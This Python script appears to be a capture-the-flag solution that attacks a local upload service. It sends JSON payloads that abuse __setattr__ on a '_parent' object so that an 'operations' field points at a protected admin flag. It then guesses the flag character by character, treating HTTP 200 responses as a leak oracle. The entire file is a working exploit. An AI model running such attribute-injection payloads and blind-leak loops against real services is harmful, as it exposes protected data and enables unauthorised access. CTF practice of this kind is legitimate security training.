import requests
import copy
import string

ENDPOINT = "http://127.0.0.1:8080/upload"

TEMPLATE = {
    "queries": [
        {
            "name": "__setattr__",
            "file_name": "_parent",
            "data": "$operations"
        },
        {
            "name": "__setattr__",
            "file_name": "_parent",
            "data": {
                "operations" : "$admin.flag"
            }
        },
        {
            "name": "index",
            "file_name": "CTF{",
            "data": 0
        }
    ]
}

def solution_by_leak():
    global TEMPLATE
    res = None
    while res != '}':
        for ch in string.printable:
            new_query = copy.deepcopy(TEMPLATE)
            new_query["queries"][-1]["file_name"] += ch
            res = requests.post(ENDPOINT, json=new_query)
            if res.status_code == 200:
                TEMPLATE = new_query
                break
        res = ch
    print(TEMPLATE["queries"][-1]["file_name"])


def main():
    solution_by_leak()


if __name__ == "__main__":
    main()
